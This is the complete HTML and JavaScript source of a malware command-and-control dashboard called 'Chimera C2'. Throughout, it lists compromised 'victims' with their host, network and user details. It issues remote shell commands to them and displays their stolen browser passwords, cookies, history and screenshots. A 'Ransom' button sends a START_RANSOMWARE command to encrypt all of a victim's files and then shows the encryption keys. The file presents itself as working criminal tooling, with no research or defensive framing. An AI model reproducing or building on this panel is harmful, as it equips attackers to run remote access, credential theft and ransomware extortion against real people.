<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0b0e1a;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1f3a, #0d1225);
            padding: 20px 30px;
            border-radius: 16px;
            border: 1px solid #2a2f4a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
            box-shadow: 0 4px 30px rgba(0,0,0,0.5);
        }
        .header h1 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(90deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header .subtitle { color: #888; font-size: 14px; margin-top: 4px; }
        .stats {
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
        }
        .stat {
            text-align: center;
        }
        .stat .number {
            font-size: 26px;
            font-weight: 700;
            color: #00ff88;
        }
        .stat .label {
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .stat .number.pending { color: #ffd700; }
        .stat .number.active { color: #00ff88; }
        .stat .number.data { color: #00b4ff; }

        .actions { display: flex; gap: 10px; align-items: center; }
        .btn-refresh {
            background: #00ff88;
            color: #0a0e1a;
            border: none;
            padding: 10px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            transition: 0.3s;
        }
        .btn-refresh:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
        .refresh-time { color: #555; font-size: 12px; }

        .victim-card {
            background: linear-gradient(135deg, #1a1f3a, #0d1225);
            border-radius: 16px;
            padding: 20px 25px;
            margin: 12px 0;
            border: 1px solid #2a2f4a;
            transition: 0.3s;
        }
        .victim-card:hover { border-color: #00ff88; box-shadow: 0 0 30px rgba(0,255,136,0.05); }
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 12px;
        }
        .victim-id { font-size: 18px; font-weight: 700; color: #00ff88; }
        .victim-status {
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background: rgba(0,255,136,0.15);
            color: #00ff88;
            border: 1px solid rgba(0,255,136,0.3);
        }
        .victim-status.offline {
            background: rgba(255,0,68,0.15);
            color: #ff0044;
            border-color: rgba(255,0,68,0.3);
        }

        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 4px 20px;
            margin: 8px 0;
            padding: 10px 0;
            border-top: 1px solid #1a1f3a;
            border-bottom: 1px solid #1a1f3a;
        }
        .detail { font-size: 13px; color: #888; }
        .detail span { color: #e0e0e0; font-weight: 500; }

        .command-box {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin: 10px 0;
        }
        .command-box input {
            flex: 1;
            min-width: 200px;
            padding: 10px 16px;
            background: #0a0e1a;
            border: 1px solid #2a2f4a;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
        }
        .command-box input:focus { outline: none; border-color: #00ff88; }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.3s;
        }
        .btn:hover { transform: scale(1.02); }
        .btn-go { background: #00ff88; color: #0a0e1a; }
        .btn-go:hover { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
        .btn-data { background: #2a2f4a; color: #fff; }
        .btn-data:hover { background: #3a3f5a; }
        .btn-screenshot { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #0a0e1a; }
        .btn-screenshot:hover { box-shadow: 0 0 20px rgba(255,215,0,0.2); }
        .btn-ransom { background: #ff0044; color: #fff; }
        .btn-ransom:hover { box-shadow: 0 0 20px rgba(255,0,68,0.4); }

        .result {
            padding: 10px 14px;
            margin-top: 8px;
            border-radius: 8px;
            font-size: 13px;
            background: #0a0e1a;
            border-left: 3px solid #ffd700;
            display: none;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }
        .result.visible { display: block; }
        .result.success { border-color: #00ff88; color: #00ff88; }
        .result.pending { border-color: #ffd700; color: #ffd700; }
        .result.error { border-color: #ff0044; color: #ff0044; }

        .tabs {
            display: flex;
            gap: 5px;
            margin: 12px 0 10px 0;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 6px 16px;
            background: #0a0e1a;
            border: 1px solid #2a2f4a;
            border-radius: 6px;
            color: #888;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: 0.3s;
        }
        .tab-btn:hover { background: #1a1f3a; color: #e0e0e0; }
        .tab-btn.active {
            background: #00ff88;
            color: #0a0e1a;
            border-color: #00ff88;
        }
        .tab-btn.ransom-tab.active {
            background: #ff0044;
            border-color: #ff0044;
            color: #fff;
        }

        .tab-content {
            display: none;
            background: #0a0e1a;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #1a1f3a;
            max-height: 350px;
            overflow-y: auto;
            margin-top: 5px;
        }
        .tab-content.active { display: block; }

        .data-item {
            padding: 6px 0;
            border-bottom: 1px solid #1a1f3a;
            font-size: 12px;
            color: #aaa;
            display: flex;
            gap: 10px;
        }
        .data-item .label { color: #666; min-width: 100px; font-weight: 500; }
        .data-item .value { color: #e0e0e0; word-break: break-all; }

        .live-stream {
            background: linear-gradient(135deg, #1a1f3a, #0d1225);
            border-radius: 16px;
            padding: 15px 20px;
            margin-top: 25px;
            border: 1px solid #2a2f4a;
            max-height: 150px;
            overflow-y: auto;
        }
        .live-stream .title {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .live-entry {
            padding: 3px 10px;
            border-bottom: 1px solid #1a1f3a;
            font-size: 12px;
            color: #888;
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .live-entry .time { color: #444; font-size: 10px; min-width: 70px; }
        .live-entry .type { font-weight: 600; min-width: 80px; font-size: 11px; }
        .live-entry .type.screenshot { color: #ffaa00; }
        .live-entry .type.command { color: #00b4ff; }
        .live-entry .type.result { color: #00ff88; }
        .live-entry .type.system { color: #888; }
        .live-entry .type.ransom { color: #ff0044; }

        .debug-info {
            color: #555;
            font-size: 12px;
            margin-top: 15px;
            padding: 10px;
            background: #0a0e1a;
            border-radius: 8px;
            border: 1px solid #1a1f3a;
        }
        .no-victims { text-align: center; padding: 60px 20px; color: #444; }
        .key-display { background: #000; color: #0f0; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 11px; word-break: break-all; max-height: 100px; overflow-y: auto; }

        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; }
            .stats { justify-content: center; }
            .actions { width: 100%; justify-content: center; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🎯 Chimera C2</h1>
            <div class="subtitle">Command & Control Dashboard</div>
        </div>
        <div class="stats">
            <div class="stat"><div class="number" id="total">0</div><div class="label">Total</div></div>
            <div class="stat"><div class="number active" id="active">0</div><div class="label">Active</div></div>
            <div class="stat"><div class="number pending" id="pending">0</div><div class="label">Pending</div></div>
            <div class="stat"><div class="number data" id="dataCount">0</div><div class="label">Data</div></div>
        </div>
        <div class="actions">
            <button class="btn-refresh" onclick="refresh()">🔄 Refresh</button>
            <span class="refresh-time" id="refreshTime">Never</span>
        </div>
    </div>

    <div id="victimsContainer"></div>

    <div class="live-stream" id="liveStream">
        <div class="title">📡 Live Events</div>
        <div class="live-entry" style="color:#333;">Waiting for events...</div>
    </div>

    <div class="debug-info" id="debugInfo">💡 Click Refresh to load data</div>

    <script>
        // ========================================================================
        //  UTILITY FUNCTIONS
        // ========================================================================
        function formatDate(d) { if (!d) return 'Never'; try { return new Date(d).toLocaleString(); } catch(e) { return d; } }
        function formatDisks(j) { try { var disks = typeof j==='string' ? JSON.parse(j) : j; if (!Array.isArray(disks) || disks.length===0) return 'No disk info'; return disks.map(function(d){return d.mount+' ('+d.total+' total, '+d.free+' free)';}).join('; '); } catch(e){return 'Invalid disk data';} }

        function addLiveEntry(type, message) {
            var stream = document.getElementById('liveStream');
            var entry = document.createElement('div');
            entry.className = 'live-entry';
            var time = new Date().toLocaleTimeString();
            var typeClass = type || 'system';
            entry.innerHTML = '<span class="time">'+time+'</span><span class="type '+typeClass+'">'+typeClass.toUpperCase()+'</span><span>'+message+'</span>';
            stream.appendChild(entry);
            while (stream.children.length > 50) stream.removeChild(stream.children[1]);
            stream.scrollTop = stream.scrollHeight;
        }

        // ========================================================================
        //  REFRESH & STATS
        // ========================================================================
        function refresh() {
            document.getElementById('debugInfo').textContent = '🔄 Loading...';
            document.getElementById('refreshTime').textContent = new Date().toLocaleTimeString();
            Promise.all([
                fetch('/api/victims').then(function(r){return r.json();}),
                fetch('/api/stats').then(function(r){return r.json();})
            ]).then(function(results) {
                var victims = results[0].victims || [];
                var stats = results[1];
                updateStats(victims, stats);
                renderVictims(victims);
                document.getElementById('debugInfo').textContent = '✅ Updated at ' + new Date().toLocaleTimeString();
                addLiveEntry('system', '🔄 Data refreshed');
            }).catch(function(e) {
                document.getElementById('debugInfo').textContent = '❌ Error: ' + e.message;
            });
        }

        function updateStats(victims, stats) {
            document.getElementById('total').textContent = victims.length;
            var active = victims.filter(function(v){return v.status==='active';}).length;
            document.getElementById('active').textContent = active;
            document.getElementById('pending').textContent = stats.pending_commands || 0;
            document.getElementById('dataCount').textContent = stats.total_data || 0;
        }

        // ========================================================================
        //  RENDER VICTIMS (using DOM for safety)
        // ========================================================================
        var currentTab = {};

        function renderVictims(victims) {
            var container = document.getElementById('victimsContainer');
            container.innerHTML = '';
            if (victims.length === 0) {
                container.innerHTML = '<div class="no-victims">🕵️ No Victims Connected</div>';
                return;
            }
            for (var i=0; i<victims.length; i++) {
                var v = victims[i];
                var vid = v.id;
                currentTab[vid] = 'info';

                var card = document.createElement('div');
                card.className = 'victim-card';

                // Header
                var header = document.createElement('div');
                header.className = 'victim-header';
                header.innerHTML = '<span class="victim-id">🖥️ '+vid+'</span><span class="victim-status'+(v.status==='active'?'':' offline')+'">'+(v.status==='active'?'● ONLINE':'● OFFLINE')+'</span>';
                card.appendChild(header);

                // Details
                var details = document.createElement('div');
                details.className = 'victim-details';
                var fields = [
                    ['Hostname', v.hostname],
                    ['IP', v.ip],
                    ['MAC', v.mac],
                    ['OS', v.os],
                    ['Arch', v.architecture],
                    ['CPU', v.cpu],
                    ['RAM', v.memory],
                    ['User', v.username],
                    ['Domain', v.domain]
                ];
                for (var f=0; f<fields.length; f++) {
                    var div = document.createElement('div');
                    div.className = 'detail';
                    div.innerHTML = fields[f][0]+': <span>'+(fields[f][1]||'Unknown')+'</span>';
                    details.appendChild(div);
                }
                var last = document.createElement('div');
                last.className = 'detail';
                last.style.gridColumn='1/-1'; last.style.color='#444'; last.style.fontSize='11px';
                last.textContent = 'First: '+formatDate(v.first_seen)+' | Last: '+formatDate(v.last_seen);
                details.appendChild(last);
                card.appendChild(details);

                // Command box
                var cmdBox = document.createElement('div');
                cmdBox.className = 'command-box';
                var input = document.createElement('input');
                input.type = 'text';
                input.id = 'cmd_'+vid;
                input.placeholder = 'Enter command...';
                input.onkeypress = function(id, e) { if (e.key==='Enter') executeCommand(id); }.bind(null, vid);
                cmdBox.appendChild(input);
                var btnRun = document.createElement('button');
                btnRun.className = 'btn btn-go';
                btnRun.textContent = '▶ Run';
                btnRun.onclick = function(id){ return function(){ executeCommand(id); }; }(vid);
                cmdBox.appendChild(btnRun);
                var btnData = document.createElement('button');
                btnData.className = 'btn btn-data';
                btnData.textContent = '📁 Data';
                btnData.onclick = function(id){ return function(){ loadData(id); }; }(vid);
                cmdBox.appendChild(btnData);
                var btnShot = document.createElement('button');
                btnShot.className = 'btn btn-screenshot';
                btnShot.textContent = '📸 Screenshot';
                btnShot.onclick = function(id){ return function(){ loadScreenshot(id); }; }(vid);
                cmdBox.appendChild(btnShot);
                var btnRansom = document.createElement('button');
                btnRansom.className = 'btn btn-ransom';
                btnRansom.textContent = '💀 Ransom';
                btnRansom.onclick = function(id){ return function(){ triggerRansomware(id); }; }(vid);
                cmdBox.appendChild(btnRansom);
                card.appendChild(cmdBox);

                // Result
                var result = document.createElement('div');
                result.id = 'result_'+vid;
                result.className = 'result';
                card.appendChild(result);

                // Tabs
                var tabs = document.createElement('div');
                tabs.className = 'tabs';
                var tabNames = ['info','system','browser','screenshots','commands','ransomware'];
                var tabLabels = ['📋 Info','🖥️ System','🌐 Browser','📸 Screenshots','⌨️ Commands','💀 Ransomware'];
                for (var t=0; t<tabNames.length; t++) {
                    var btn = document.createElement('button');
                    btn.className = 'tab-btn' + (t===0?' active':'') + (tabNames[t]==='ransomware'?' ransom-tab':'');
                    btn.textContent = tabLabels[t];
                    btn.dataset.tab = tabNames[t];
                    btn.onclick = function(id, tab){ return function(){ switchTab(id, tab); }; }(vid, tabNames[t]);
                    tabs.appendChild(btn);
                }
                card.appendChild(tabs);

                // Tab content
                var contentDiv = document.createElement('div');
                contentDiv.id = 'tab_content_'+vid;
                for (var t2=0; t2<tabNames.length; t2++) {
                    var content = document.createElement('div');
                    content.className = 'tab-content' + (t2===0?' active':'');
                    content.id = 'tab_'+tabNames[t2]+'_'+vid;
                    if (tabNames[t2] === 'ransomware') {
                        content.innerHTML = '<div style="color:#666;padding:10px;text-align:center;">💀 Ransomware status: <span id="ransom_status_'+vid+'">Not executed</span></div>';
                    } else {
                        content.innerHTML = '<div style="color:#666;padding:10px;text-align:center;">Click to load</div>';
                    }
                    contentDiv.appendChild(content);
                }
                card.appendChild(contentDiv);

                container.appendChild(card);
            }
        }

        // ========================================================================
        //  TAB SWITCHING
        // ========================================================================
        function switchTab(vid, tab) {
            currentTab[vid] = tab;
            var tabs = document.querySelectorAll('#tabs_'+vid+' .tab-btn');
            tabs.forEach(function(b){ b.classList.remove('active'); if (b.dataset.tab === tab) b.classList.add('active'); });
            var contents = document.querySelectorAll('#tab_content_'+vid+' .tab-content');
            contents.forEach(function(c){ c.classList.remove('active'); if (c.id === 'tab_'+tab+'_'+vid) c.classList.add('active'); });
            if (tab === 'ransomware') loadRansomwareStatus(vid);
        }

        // ========================================================================
        //  LOAD DATA (System, Browser, Commands)
        // ========================================================================
        function loadData(vid) {
            var res = document.getElementById('result_'+vid);
            res.textContent = '📁 Loading data...';
            res.className = 'result visible pending';
            fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.error) { res.textContent='❌ Error: '+data.error; res.className='result visible error'; return; }
                res.textContent = '✅ Data loaded';
                res.className = 'result visible success';

                var sysTab = document.getElementById('tab_system_'+vid);
                var brTab = document.getElementById('tab_browser_'+vid);
                var infoTab = document.getElementById('tab_info_'+vid);
                var cmdTab = document.getElementById('tab_commands_'+vid);

                // ---- System ----
                var sysData = data.data.find(function(d){return d.type==='system_info';});
                if (sysData) {
                    var c = sysData.content;
                    sysTab.innerHTML = 
                        '<div class="data-item"><span class="label">OS</span><span class="value">'+c.os+' '+c.os_version+'</span></div>'+
                        '<div class="data-item"><span class="label">Arch</span><span class="value">'+c.architecture+'</span></div>'+
                        '<div class="data-item"><span class="label">CPU</span><span class="value">'+c.cpu+'</span></div>'+
                        '<div class="data-item"><span class="label">RAM</span><span class="value">'+c.memory+'</span></div>'+
                        '<div class="data-item"><span class="label">Disks</span><span class="value">'+formatDisks(c.disks)+'</span></div>';
                } else {
                    sysTab.innerHTML = '<div style="color:#666;padding:10px;">No system info.</div>';
                }

                // ---- Browser ----
                var brData = data.data.find(function(d){return d.type==='browser_data';});
                if (brData) {
                    var bc = brData.content;
                    var html = '';
                    if (bc.passwords && bc.passwords.length) {
                        html += '<div style="color:#ffd700;font-weight:600;">🔑 Passwords ('+bc.passwords.length+')</div>';
                        bc.passwords.slice(0,5).forEach(function(p){ html += '<div class="data-item"><span class="label">'+p.url+'</span><span class="value">'+p.username+':'+p.password+'</span></div>'; });
                    }
                    if (bc.cookies && bc.cookies.length) {
                        html += '<div style="color:#ffd700;font-weight:600;margin-top:10px;">🍪 Cookies ('+bc.cookies.length+')</div>';
                        bc.cookies.slice(0,5).forEach(function(c){ html += '<div class="data-item"><span class="label">'+c.domain+'</span><span class="value">'+c.name+'='+c.value+'</span></div>'; });
                    }
                    if (bc.history && bc.history.length) {
                        html += '<div style="color:#ffd700;font-weight:600;margin-top:10px;">📜 History ('+bc.history.length+')</div>';
                        bc.history.slice(0,5).forEach(function(h){ html += '<div class="data-item"><span class="label">'+h.title+'</span><span class="value url">'+h.url+'</span></div>'; });
                    }
                    brTab.innerHTML = html || '<div style="color:#666;">No browser data.</div>';
                } else {
                    brTab.innerHTML = '<div style="color:#666;padding:10px;">No browser data.</div>';
                }

                // ---- Info ----
                var v = data.victim;
                infoTab.innerHTML = 
                    '<div class="data-item"><span class="label">Victim ID</span><span class="value">'+v.id+'</span></div>'+
                    '<div class="data-item"><span class="label">Hostname</span><span class="value">'+v.hostname+'</span></div>'+
                    '<div class="data-item"><span class="label">IP</span><span class="value">'+v.ip+'</span></div>'+
                    '<div class="data-item"><span class="label">MAC</span><span class="value">'+v.mac+'</span></div>'+
                    '<div class="data-item"><span class="label">OS</span><span class="value">'+v.os+'</span></div>'+
                    '<div class="data-item"><span class="label">Status</span><span class="value">'+v.status+'</span></div>';

                // ---- Commands (with result) ----
                if (data.commands && data.commands.length) {
                    var cmdHtml = '';
                    data.commands.forEach(function(c){
                        var resultText = '';
                        if (c.result && c.result !== '{}') {
                            try { 
                                var parsed = JSON.parse(c.result);
                                resultText = ' → '+parsed; 
                            } catch(e) { resultText = ' → '+c.result; }
                        }
                        cmdHtml += '<div class="data-item"><span class="label">'+formatDate(c.issued_at)+'</span><span class="value" style="color:'+(c.status==='executed'?'#00ff88':'#ffd700')+';">'+c.command+'</span><span style="color:#888;font-size:11px;">'+c.status+resultText+'</span></div>';
                    });
                    cmdTab.innerHTML = cmdHtml;
                } else {
                    cmdTab.innerHTML = '<div style="color:#666;padding:10px;">No commands.</div>';
                }

                // update ransomware tab if it's already active
                if (currentTab[vid] === 'ransomware') loadRansomwareStatus(vid);
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        // ========================================================================
        //  LOAD SCREENSHOT
        // ========================================================================
        function loadScreenshot(vid) {
            var res = document.getElementById('result_'+vid);
            res.textContent = '📸 Loading screenshot...';
            res.className = 'result visible pending';
            fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.error) { res.textContent='❌ Error: '+data.error; res.className='result visible error'; return; }
                var shot = data.data.find(function(d){return d.type==='screenshot';});
                var tab = document.getElementById('tab_screenshots_'+vid);
                if (shot && shot.content && shot.content.image) {
                    tab.innerHTML = '<div class="screenshot-container"><img src="data:image/png;base64,'+shot.content.image+'" style="max-width:100%;max-height:400px;border-radius:8px;border:1px solid #2a2f4a;"/><div style="color:#666;font-size:11px;margin-top:5px;">Taken: '+formatDate(shot.timestamp)+'</div></div>';
                    res.textContent = '✅ Screenshot loaded';
                    res.className = 'result visible success';
                    addLiveEntry('screenshot', '📸 Screenshot loaded for '+vid);
                } else {
                    tab.innerHTML = '<div style="color:#666;padding:10px;">No screenshot</div>';
                    res.textContent = '⚠️ No screenshot found';
                    res.className = 'result visible error';
                }
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        // ========================================================================
        //  EXECUTE COMMAND
        // ========================================================================
        function executeCommand(vid) {
            var input = document.getElementById('cmd_'+vid);
            var cmd = input.value.trim();
            if (!cmd) return;
            var res = document.getElementById('result_'+vid);
            res.textContent = '⏳ Sending command...';
            res.className = 'result visible pending';
            addLiveEntry('command', '⌨️ Command sent to '+vid+': '+cmd);

            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({victim_id:vid, command:cmd})
            }).then(function(r){return r.json();}).then(function(data){
                if (data.status==='queued') {
                    res.textContent = '✅ Command queued. Waiting for result...';
                    res.className = 'result visible success';
                    checkResult(vid, data.command_id);
                } else {
                    res.textContent = '❌ Error: '+(data.message||'Unknown');
                    res.className = 'result visible error';
                }
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        // ========================================================================
        //  CHECK RESULT (polling)
        // ========================================================================
        function checkResult(vid, cid) {
            var attempts = 0;
            var maxAttempts = 20;
            var interval = setInterval(function() {
                attempts++;
                fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                    if (data.error) return;
                    var cmd = data.commands.find(function(c){return c.id===cid;});
                    if (cmd && cmd.status==='executed') {
                        clearInterval(interval);
                        var res = document.getElementById('result_'+vid);
                        var resultText = '';
                        if (cmd.result && cmd.result !== '{}') {
                            try { 
                                var parsed = JSON.parse(cmd.result);
                                resultText = parsed; 
                            } catch(e) { resultText = cmd.result; }
                        } else {
                            resultText = 'No output';
                        }
                        res.textContent = '✅ Command executed. Result:\n'+resultText;
                        res.className = 'result visible success';
                        addLiveEntry('result', '✅ Command result for '+vid);
                        loadData(vid); // refresh commands tab
                    } else if (attempts >= maxAttempts) {
                        clearInterval(interval);
                        var res = document.getElementById('result_'+vid);
                        res.textContent = '⏳ Still pending after 60s.';
                        res.className = 'result visible pending';
                    }
                }).catch(function(){});
            }, 3000);
        }

        // ========================================================================
        //  RANSOMWARE TRIGGER
        // ========================================================================
        function triggerRansomware(vid) {
            if (!confirm('⚠️ Start full ransomware encryption on '+vid+'? This will encrypt all files!')) return;
            var res = document.getElementById('result_'+vid);
            res.textContent = '💀 Sending START_RANSOMWARE...';
            res.className = 'result visible pending';
            addLiveEntry('ransom', '💀 Ransomware triggered on '+vid);

            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({victim_id:vid, command:'START_RANSOMWARE'})
            }).then(function(r){return r.json();}).then(function(data){
                if (data.status==='queued') {
                    res.textContent = '✅ Ransomware command sent!';
                    res.className = 'result visible success';
                    setTimeout(function(){ checkResult(vid, data.command_id); }, 10000);
                    setTimeout(function(){ loadRansomwareStatus(vid); }, 15000);
                } else {
                    res.textContent = '❌ Error: '+(data.message||'Unknown');
                    res.className = 'result visible error';
                }
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        // ========================================================================
        //  LOAD RANSOMWARE STATUS
        // ========================================================================
        function loadRansomwareStatus(vid) {
            var tab = document.getElementById('tab_ransomware_'+vid);
            tab.innerHTML = '🔄 Loading ransomware status...';
            fetch('/api/ransomware/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.exists) {
                    var rk = data.data;
                    tab.innerHTML = 
                        '<div style="color:#ff0044;font-weight:600;margin-bottom:10px;">💀 RANSOMWARE EXECUTED</div>'+
                        '<div class="data-item"><span class="label">Files Encrypted</span><span class="value" style="color:#ffd700;font-size:16px;">'+rk.files_encrypted+'</span></div>'+
                        '<div class="data-item"><span class="label">Last Updated</span><span class="value">'+formatDate(rk.updated_at)+'</span></div>'+
                        '<div style="margin-top:15px;color:#ffd700;font-weight:600;">🔑 Private Key</div>'+
                        '<div class="key-display">'+(rk.private_key||'Not received')+'</div>'+
                        '<div style="margin-top:10px;color:#ffd700;font-weight:600;">🔐 HMAC Keys</div>'+
                        '<div class="key-display">'+JSON.stringify(rk.hmac_keys, null, 2)+'</div>';
                    document.getElementById('ransom_status_'+vid).textContent = 'Executed';
                } else {
                    tab.innerHTML = '<div style="color:#666;padding:10px;">No ransomware data yet. Use the 💀 Ransom button to start.</div>';
                    document.getElementById('ransom_status_'+vid).textContent = 'Not executed';
                }
            }).catch(function(e){ tab.innerHTML = '❌ Error loading ransomware status'; });
        }

        // ========================================================================
        //  AUTO REFRESH
        // ========================================================================
        function autoRefresh() { refresh(); setInterval(refresh, 30000); }
        autoRefresh();
    </script>
</body>
</html>
